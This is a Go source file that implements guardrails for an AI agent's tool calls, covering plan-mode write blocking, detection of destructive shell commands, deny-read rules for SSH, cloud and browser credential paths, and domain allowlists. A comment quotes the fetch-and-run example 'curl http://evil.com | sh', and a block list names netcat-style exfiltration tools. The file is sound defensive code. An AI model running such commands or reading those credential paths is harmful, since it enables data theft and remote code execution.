package guardrails

import (
	"net/url"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

type SandboxMode string

const (
	ModeNone  SandboxMode = "none"
	ModeBasic SandboxMode = "basic"
	ModeFull  SandboxMode = "full"
)

type ToolCall struct {
	Name string
	Args map[string]any
}

type SessionState struct {
	PlanMode bool
}

type SandboxConfig struct {
	Mode       SandboxMode
	Filesystem *FilesystemConfig
	Network    *NetworkConfig
}

type FilesystemConfig struct {
	DenyRead   []string
	AllowWrite []string
	DenyWrite  []string
}

type NetworkConfig struct {
	AllowedDomains []string
	DeniedDomains  []string
}

type EvalEnv struct {
	CWD     string
	HomeDir string
	Session SessionState
	Config  SandboxConfig
}

type Decision struct {
	Allowed bool
	Reason  string
	Policy  PolicyInfo
}

type PolicyInfo struct {
	PlanMode        bool
	SandboxMode     SandboxMode
	SandboxActive   bool
	NetworkEnforced bool
	Filesystem      FilesystemPolicy
	Network         NetworkPolicy
}

type FilesystemPolicy struct {
	DenyRead   []string
	AllowWrite []string
	DenyWrite  []string
}

type NetworkPolicy struct {
	AllowedDomains []string
	DeniedDomains  []string
}

var writeBlockedToolNames = map[string]struct{}{
	"edit":          {},
	"write":         {},
	"write_file":    {},
	"subagent":      {},
	"spawn_session": {},
}

var spawnBlockedToolNames = map[string]struct{}{
	"subagent":      {},
	"spawn_session": {},
}

// sandboxOnlyPatterns matches commands that are only allowed in sandbox mode.
// Uses (\s|$) suffix instead of $ anchor so arguments like "sudo rm -rf /" are
// also caught — bare $ would only match "sudo" with nothing after it.
//
// Shell interpreters (sh, bash, zsh, etc.) are included because they can
// execute arbitrary piped input, making them a common bypass vector when
// combined with chaining operators (e.g. "curl http://evil.com | sh").
var sandboxOnlyPatterns = []*regexp.Regexp{
	regexp.MustCompile(`^sudo(\s|$)|^su(\s|$)|^kill(\s|$)|^pkill(\s|$)|^killall(\s|$)|^reboot(\s|$)|^shutdown(\s|$)`),
	regexp.MustCompile(`^eval(\s|$)|^source(\s|$)|^\.(\s|$)`),
	regexp.MustCompile(`^sh(\s|$)|^bash(\s|$)|^zsh(\s|$)|^fish(\s|$)|^dash(\s|$)|^ksh(\s|$)|^csh(\s|$)|^tcsh(\s|$)`),
}

var noSandboxMutatingCommands = map[string]struct{}{
	"rm": {}, "rmdir": {}, "mv": {}, "cp": {}, "mkdir": {}, "touch": {},
	"chmod": {}, "chown": {}, "chgrp": {}, "ln": {}, "tee": {}, "truncate": {},
	"dd": {}, "shred": {}, "install": {}, "mkfifo": {}, "mknod": {},
	// Network relay/exfiltration tools — can pipe data to arbitrary hosts.
	"nc": {}, "ncat": {}, "netcat": {}, "socat": {},
}

var gitSafeSubcommands = map[string]struct{}{
	"status": {}, "log": {}, "diff": {}, "show": {}, "blame": {}, "grep": {}, "shortlog": {},
	"branch": {}, "tag": {}, "remote": {}, "stash": {}, "ls-files": {}, "ls-tree": {},
	"ls-remote": {}, "cat-file": {}, "rev-parse": {}, "rev-list": {}, "for-each-ref": {},
	"name-rev": {}, "describe": {}, "merge-base": {}, "count-objects": {}, "fsck": {},
	"verify-commit": {}, "verify-tag": {}, "verify-pack": {}, "diff-tree": {}, "diff-files": {},
	"diff-index": {}, "archive": {}, "cherry": {}, "range-diff": {}, "help": {}, "version": {},
	"config": {}, "reflog": {}, "worktree": {},
}

// operatorRe matches shell chaining operators without requiring surrounding
// whitespace.  Multi-char operators (||, &&) are listed before the single-char
// | so the regex engine prefers the longer match at each position.
var operatorRe = regexp.MustCompile(`\|\||&&|;|\|`)

func EvaluateToolCall(call ToolCall, env EvalEnv) Decision {
	policy := resolvePolicy(env)

	if call.Name == "bash" && policy.SandboxActive {
		return deny(policy, "Sandbox deny: bash requires executor-level sandbox enforcement; argument-level policy checks cannot safely constrain shell filesystem or network access.")
	}

	if env.Session.PlanMode {
		if call.Name == "toggle_plan_mode" || call.Name == "plan_mode" {
			return allow(policy)
		}
		if _, blocked := writeBlockedToolNames[call.Name]; blocked {
			if _, isSpawnTool := spawnBlockedToolNames[call.Name]; isSpawnTool {
				return deny(policy, `Plan mode: "`+call.Name+`" is blocked — spawning sessions creates child contexts with full write access, bypassing plan mode. Use toggle_plan_mode to exit plan mode first.`)
			}
			return deny(policy, `Plan mode: "`+call.Name+`" is blocked in read-only mode. Use toggle_plan_mode to exit plan mode first.`)
		}
		if call.Name == "bash" {
			command := stringArg(call.Args, "command")
			if isDestructiveCommand(command, policy.SandboxActive) {
				return deny(policy, "Plan mode: command blocked (matches destructive pattern). Use toggle_plan_mode to exit plan mode first.\nCommand: "+command)
			}
		}
	}

	if path, ok := firstString(call.Args, "path", "file", "filePath", "targetPath"); ok {
		normalized := normalizePath(path, env.CWD, env.HomeDir)
		switch accessKindForTool(call.Name) {
		case accessRead:
			if reason := validateReadPath(normalized, policy); reason != "" {
				return deny(policy, reason)
			}
		case accessWrite:
			if reason := validateWritePath(normalized, policy); reason != "" {
				return deny(policy, reason)
			}
		}
	}

	if rawURL, ok := firstString(call.Args, "url", "uri", "endpoint"); ok {
		if reason := validateURL(rawURL, policy); reason != "" {
			return deny(policy, reason)
		}
	}

	return allow(policy)
}

type accessKind int

const (
	accessNone accessKind = iota
	accessRead
	accessWrite
)

func accessKindForTool(toolName string) accessKind {
	switch toolName {
	case "read", "read_file":
		return accessRead
	case "write", "write_file", "edit":
		return accessWrite
	default:
		return accessNone
	}
}

func resolvePolicy(env EvalEnv) PolicyInfo {
	mode := env.Config.Mode
	if mode == "" {
		mode = ModeBasic
	}
	if mode == ModeNone {
		return PolicyInfo{PlanMode: env.Session.PlanMode, SandboxMode: mode}
	}

	fsDenyRead := []string{
		normalizePath("~/.ssh", env.CWD, env.HomeDir),
		normalizePath("~/.aws", env.CWD, env.HomeDir),
		normalizePath("~/.gnupg", env.CWD, env.HomeDir),
		normalizePath("~/.config/gcloud", env.CWD, env.HomeDir),
		normalizePath("~/.docker/config.json", env.CWD, env.HomeDir),
		normalizePath("~/Library/Application Support/Google/Chrome", env.CWD, env.HomeDir),
		normalizePath("~/Library/Application Support/Firefox", env.CWD, env.HomeDir),
		normalizePath("~/.mozilla/firefox", env.CWD, env.HomeDir),
		normalizePath("~/.config/google-chrome", env.CWD, env.HomeDir),
		normalizePath("~/.config/chromium", env.CWD, env.HomeDir),
	}
	fsDenyWrite := []string{
		normalizePath(".env", env.CWD, env.HomeDir),
		normalizePath(".env.local", env.CWD, env.HomeDir),
		normalizePath("~/.ssh", env.CWD, env.HomeDir),
	}
	fsAllowWrite := []string{normalizePath(".", env.CWD, env.HomeDir), normalizePath("/tmp", env.CWD, env.HomeDir)}

	if env.Config.Filesystem != nil {
		fsDenyRead = append(fsDenyRead, normalizePaths(env.Config.Filesystem.DenyRead, env.CWD, env.HomeDir)...)
		fsDenyWrite = append(fsDenyWrite, normalizePaths(env.Config.Filesystem.DenyWrite, env.CWD, env.HomeDir)...)
		if env.Config.Filesystem.AllowWrite != nil {
			fsAllowWrite = normalizePaths(env.Config.Filesystem.AllowWrite, env.CWD, env.HomeDir)
		}
	}

	policy := PolicyInfo{
		PlanMode:      env.Session.PlanMode,
		SandboxMode:   mode,
		SandboxActive: true,
		Filesystem: FilesystemPolicy{
			DenyRead:   dedupeSorted(fsDenyRead),
			AllowWrite: dedupeSorted(fsAllowWrite),
			DenyWrite:  dedupeSorted(fsDenyWrite),
		},
	}

	if mode == ModeFull {
		allowed := []string{}
		denied := []string{}
		if env.Config.Network != nil {
			if env.Config.Network.AllowedDomains != nil {
				allowed = normalizeDomains(env.Config.Network.AllowedDomains)
			}
			denied = append(denied, normalizeDomains(env.Config.Network.DeniedDomains)...)
		}
		policy.NetworkEnforced = true
		policy.Network = NetworkPolicy{AllowedDomains: allowed, DeniedDomains: dedupeSorted(denied)}
		return policy
	}

	if env.Config.Network != nil && env.Config.Network.AllowedDomains != nil {
		policy.NetworkEnforced = true
		policy.Network = NetworkPolicy{
			AllowedDomains: normalizeDomains(env.Config.Network.AllowedDomains),
			DeniedDomains:  dedupeSorted(normalizeDomains(env.Config.Network.DeniedDomains)),
		}
	}
	return policy
}

func validateReadPath(path string, policy PolicyInfo) string {
	if !policy.SandboxActive {
		return ""
	}
	for _, denied := range policy.Filesystem.DenyRead {
		if pathWithin(path, denied) {
			return "Sandbox deny: read access to " + path + " is blocked by filesystem.denyRead."
		}
	}
	return ""
}

func validateWritePath(path string, policy PolicyInfo) string {
	if !policy.SandboxActive {
		return ""
	}
	allowed := false
	for _, prefix := range policy.Filesystem.AllowWrite {
		if pathWithin(path, prefix) {
			allowed = true
			break
		}
	}
	if !allowed {
		return "Sandbox deny: write access to " + path + " is outside filesystem.allowWrite."
	}
	for _, denied := range policy.Filesystem.DenyWrite {
		if pathWithin(path, denied) {
			return "Sandbox deny: write access to " + path + " is blocked by filesystem.denyWrite."
		}
	}
	return ""
}

func validateURL(rawURL string, policy PolicyInfo) string {
	if !policy.SandboxActive || !policy.NetworkEnforced {
		return ""
	}
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "Sandbox deny: invalid URL " + rawURL + "."
	}
	host := normalizeDomain(parsed.Hostname())
	if host == "" {
		return "Sandbox deny: invalid URL " + rawURL + "."
	}
	for _, denied := range policy.Network.DeniedDomains {
		if hostMatchesDomain(host, denied) {
			return "Sandbox deny: network access to " + host + " is blocked by network.deniedDomains."
		}
	}
	if len(policy.Network.AllowedDomains) == 0 {
		return "Sandbox deny: network access to " + host + " is blocked; no domains are allowed in the active sandbox policy."
	}
	for _, allowed := range policy.Network.AllowedDomains {
		if hostMatchesDomain(host, allowed) {
			return ""
		}
	}
	return "Sandbox deny: network access to " + host + " is not in network.allowedDomains."
}

// stripQuotedSegments replaces single- and double-quoted strings with
// placeholder text so that shell operators inside quotes are not treated as
// real chaining operators.  The result is only used for operator-detection;
// token parsing still runs on the original command string.
//
// Handles backslash escapes inside double-quoted strings (e.g. \" does not
// close the string).  Single-quoted strings are treated as fully literal —
// bash does not allow any escape sequence inside single quotes.
func stripQuotedSegments(command string) string {
	var buf strings.Builder
	inSingle := false
	inDouble := false
	for i := 0; i < len(command); i++ {
		c := command[i]
		switch {
		case inDouble && c == '\\':
			// Backslash inside double quotes escapes the next character.
			// Mask both the backslash and the character it escapes so that an
			// escaped quote (\"  ) does not prematurely close the string.
			buf.WriteByte('X')
			if i+1 < len(command) {
				i++
				buf.WriteByte('X')
			}
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			buf.WriteByte('X')
		case c == '"' && !inSingle:
			inDouble = !inDouble
			buf.WriteByte('X')
		case inSingle || inDouble:
			buf.WriteByte('X') // mask content inside quotes
		default:
			buf.WriteByte(c)
		}
	}
	return buf.String()
}

// splitOnFirstOperator finds the leftmost shell chaining operator (||, &&, ;,
// or |) in the quote-stripped version of the command and returns the left and
// right sub-commands from the original (unstripped) string, trimmed of
// surrounding whitespace so that recursive evaluation starts clean.
func splitOnFirstOperator(original, stripped string) (left, right string, ok bool) {
	loc := operatorRe.FindStringIndex(stripped)
	if loc == nil {
		return "", "", false
	}
	return strings.TrimSpace(original[:loc[0]]), strings.TrimSpace(original[loc[1]:]), true
}

// isDestructiveCommand returns true if the given shell command (or any
// sub-command produced by splitting on chaining operators) would be considered
// destructive.
func isDestructiveCommand(command string, sandboxActive bool) bool {
	command = strings.TrimSpace(command)
	if command == "" {
		return false
	}

	// Fast path: sub-process substitution, newlines, and process substitution
	// are always destructive regardless of quoting.
	if strings.Contains(command, "$(") {
		return true
	}
	if strings.Contains(command, "`") || strings.Contains(command, "\n") || strings.Contains(command, "<(") || strings.Contains(command, ">(") {
		return true
	}

	// Check for subshell execution via parentheses: (cmd) or ( cmd ).
	// Strip quoted segments first to avoid false positives on quoted parens
	// like find . -name '*.go' or echo "(note)".
	// We flag two patterns on the stripped command:
	//   1. Leading '(' after trim — e.g. "(rm -rf /)"
	//   2. ' (' anywhere — e.g. "test -f foo && (rm -rf /)"
	// This is conservative: it catches the bypass without touching the quoted
	// content that legitimate commands carry.
	strippedForSubshell := stripQuotedSegments(command)
	trimmedStripped := strings.TrimSpace(strippedForSubshell)
	if strings.HasPrefix(trimmedStripped, "(") || strings.Contains(trimmedStripped, " (") {
		return true
	}

	// Check for shell chaining operators (;, &&, ||, |) by scanning the
	// quote-stripped command so we don't fire on operators inside strings.
	stripped := stripQuotedSegments(command)
	if left, right, ok := splitOnFirstOperator(command, stripped); ok {
		// If either side of the operator is destructive, the whole command is.
		// Recursion handles deeper chains (a ; b ; c splits to (a) and (b ; c)).
		return isDestructiveCommand(left, sandboxActive) || isDestructiveCommand(right, sandboxActive)
	}

	// No chaining operators found — evaluate this as a single command.
	for _, pattern := range sandboxOnlyPatterns {
		if pattern.MatchString(command) {
			return true
		}
	}
	tokens := fields(command)
	if len(tokens) == 0 {
		return false
	}
	first := strings.ToLower(tokens[0])
	if strings.HasPrefix(first, "git") {
		return isDestructiveGit(tokens)
	}
	if first == "curl" {
		return isMutatingCurl(tokens)
	}
	if first == "wget" {
		return isMutatingWget(tokens)
	}
	if first == "npx" {
		return true
	}
	if first == "npm" && len(tokens) > 1 && strings.EqualFold(tokens[1], "publish") {
		return true
	}
	if first == "docker" && len(tokens) > 1 && strings.EqualFold(tokens[1], "push") {
		return true
	}
	if first == "gh" && len(tokens) > 2 {
		group := strings.ToLower(tokens[1])
		action := strings.ToLower(tokens[2])
		if (group == "issue" || group == "pr" || group == "release") && (action == "create" || action == "edit" || action == "close" || action == "merge" || action == "delete" || action == "comment") {
			return true
		}
	}
	if sandboxActive {
		return false
	}
	if _, ok := noSandboxMutatingCommands[first]; ok {
		return true
	}
	if strings.Contains(command, ">>") || unsafeOutputRedirection(command) {
		return true
	}
	return false
}

func isDestructiveGit(tokens []string) bool {
	if len(tokens) < 2 {
		return false
	}
	subcmd := strings.ToLower(tokens[1])
	if _, ok := gitSafeSubcommands[subcmd]; !ok {
		return true
	}
	rest := lowerSlice(tokens[2:])
	switch subcmd {
	case "branch":
		for _, token := range rest {
			if token == "-d" || token == "-D" || token == "-m" || token == "-M" || token == "-c" || token == "-C" {
				return true
			}
		}
	case "tag":
		for _, token := range rest {
			if strings.HasPrefix(token, "-") {
				if token == "-d" || token == "-s" || token == "-a" || token == "-f" || token == "-u" || token == "--delete" {
					return true
				}
				continue
			}
			return true
		}
	case "remote":
		if len(rest) > 0 {
			switch rest[0] {
			case "add", "remove", "rm", "rename", "set-url", "set-head", "set-branches", "prune", "update":
				return true
			}
		}
	case "stash":
		if len(rest) == 0 {
			return true
		}
		switch rest[0] {
		case "push", "save", "drop", "pop", "apply", "clear", "create", "store":
			return true
		}
	case "config":
		for _, token := range rest {
			if strings.HasPrefix(token, "--unset") || token == "--remove-section" || token == "--rename-section" || token == "--replace-all" || token == "--add" {
				return true
			}
		}
		if len(rest) >= 2 && !strings.HasPrefix(rest[0], "--get") && rest[0] != "--list" && rest[0] != "--show-origin" && rest[0] != "--show-scope" {
			return true
		}
	case "reflog":
		if len(rest) > 0 && (rest[0] == "delete" || rest[0] == "expire") {
			return true
		}
	case "worktree":
		if len(rest) > 0 {
			switch rest[0] {
			case "add", "remove", "move", "repair", "lock", "unlock":
				return true
			}
		}
	case "archive":
		for _, token := range rest {
			if token == "-o" || strings.HasPrefix(token, "-o") || token == "--output" || strings.HasPrefix(token, "--output=") {
				return true
			}
		}
	}
	return false
}

func isMutatingCurl(tokens []string) bool {
	for i, token := range tokens[1:] {
		lower := strings.ToLower(token)
		if strings.HasPrefix(lower, "-x") && lower != "-x" {
			verb := strings.TrimPrefix(lower, "-x")
			if isHTTPWriteVerb(verb) {
				return true
			}
		}
		if lower == "-x" && i+2 <= len(tokens[1:]) {
			if isHTTPWriteVerb(tokens[i+2]) {
				return true
			}
		}
		if strings.HasPrefix(lower, "--request=") && isHTTPWriteVerb(strings.TrimPrefix(lower, "--request=")) {
			return true
		}
		if lower == "--request" && i+2 <= len(tokens[1:]) {
			if isHTTPWriteVerb(tokens[i+2]) {
				return true
			}
		}
		if lower == "-d" || strings.HasPrefix(lower, "--data") || lower == "--json" {
			return true
		}
	}
	return false
}

func isMutatingWget(tokens []string) bool {
	for _, token := range tokens[1:] {
		lower := strings.ToLower(token)
		if lower == "--post-data" || lower == "--post-file" || strings.HasPrefix(lower, "--post-data=") || strings.HasPrefix(lower, "--post-file=") {
			return true
		}
	}
	return false
}

func isHTTPWriteVerb(value string) bool {
	switch strings.ToUpper(strings.TrimSpace(value)) {
	case "POST", "PUT", "DELETE", "PATCH":
		return true
	default:
		return false
	}
}

func unsafeOutputRedirection(command string) bool {
	for i := 0; i < len(command); i++ {
		if command[i] != '>' {
			continue
		}
		if i > 0 && command[i-1] == '>' {
			continue
		}
		target := strings.TrimSpace(command[i+1:])
		if strings.HasPrefix(target, "/dev/null") {
			continue
		}
		return true
	}
	return false
}

func normalizePath(path, cwd, home string) string {
	if strings.HasPrefix(path, "~/") {
		path = filepath.Join(home, strings.TrimPrefix(path, "~/"))
	} else if path == "~" {
		path = home
	} else if path == "." {
		path = cwd
	} else if !filepath.IsAbs(path) {
		path = filepath.Join(cwd, path)
	}
	return filepath.Clean(path)
}

func normalizePaths(paths []string, cwd, home string) []string {
	out := make([]string, 0, len(paths))
	for _, path := range paths {
		out = append(out, normalizePath(path, cwd, home))
	}
	return out
}

func pathWithin(path, prefix string) bool {
	path = filepath.Clean(path)
	prefix = filepath.Clean(prefix)
	if path == prefix {
		return true
	}
	rel, err := filepath.Rel(prefix, path)
	if err != nil {
		return false
	}
	return rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator))
}

func normalizeDomains(domains []string) []string {
	out := make([]string, 0, len(domains))
	for _, domain := range domains {
		if normalized := normalizeDomain(domain); normalized != "" {
			out = append(out, normalized)
		}
	}
	return out
}

func normalizeDomain(domain string) string {
	domain = strings.ToLower(strings.TrimSpace(domain))
	return strings.TrimSuffix(domain, ".")
}

func hostMatchesDomain(host, domain string) bool {
	host = normalizeDomain(host)
	domain = normalizeDomain(domain)
	return host == domain || strings.HasSuffix(host, "."+domain)
}

func firstString(args map[string]any, keys ...string) (string, bool) {
	for _, key := range keys {
		if value, ok := args[key]; ok {
			if text, ok := value.(string); ok && text != "" {
				return text, true
			}
		}
	}
	return "", false
}

func stringArg(args map[string]any, key string) string {
	if args == nil {
		return ""
	}
	if value, ok := args[key]; ok {
		if text, ok := value.(string); ok {
			return text
		}
	}
	return ""
}

func allow(policy PolicyInfo) Decision {
	return Decision{Allowed: true, Policy: policy}
}

func deny(policy PolicyInfo, reason string) Decision {
	return Decision{Allowed: false, Reason: reason, Policy: policy}
}

func dedupeSorted(items []string) []string {
	seen := map[string]struct{}{}
	out := make([]string, 0, len(items))
	for _, item := range items {
		if item == "" {
			continue
		}
		if _, ok := seen[item]; ok {
			continue
		}
		seen[item] = struct{}{}
		out = append(out, item)
	}
	sort.Strings(out)
	return out
}

func fields(s string) []string {
	return strings.Fields(strings.TrimSpace(s))
}

func lowerSlice(items []string) []string {
	out := make([]string, len(items))
	for i, item := range items {
		out[i] = strings.ToLower(item)
	}
	return out
}
